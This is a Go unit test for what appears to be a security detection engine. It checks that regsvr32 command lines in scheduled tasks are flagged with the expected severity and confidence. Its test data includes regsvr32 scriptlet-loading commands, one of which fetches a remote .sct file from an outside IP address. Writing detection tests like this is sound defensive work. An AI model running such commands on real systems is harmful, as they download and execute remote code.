package detect

import (
	"testing"
	"tracefall/internal/model"
)

func TestReviewRegsvrIndependentDLLTarget(t *testing.T) {
	for _, tt := range []struct{ cmd, severity, confidence string }{
		{`regsvr32.exe /s /i:local \\host01\share\scrobj.dll`, "high", "medium"},
		{`regsvr32.exe /s /i:local C:\Temp\scrobj.dll`, "medium", "low"},
		{`regsvr32.exe /s /i:local C:\Tools\scrobj.dll`, "", ""},
		{`regsvr32.exe /s /i:https://203.0.113.8/a.sct C:\Temp\scrobj.dll`, "high", "medium"},
	} {
		t.Run(tt.cmd, func(t *testing.T) {
			fs := (newScheduledTask{}).Evaluate([]model.Event{taskEvent("e", "ActionReview", "alice", tt.cmd, "regsvr32.exe")})
			if tt.severity == "" {
				if !contextOnlyTaskFindings(fs) {
					t.Fatalf("data activated: %+v", fs)
				}
				return
			}
			if len(fs) != 1 || fs[0].Severity != tt.severity || fs[0].Confidence != tt.confidence {
				t.Fatalf("independent DLL target lost: %+v", fs)
			}
		})
	}
}
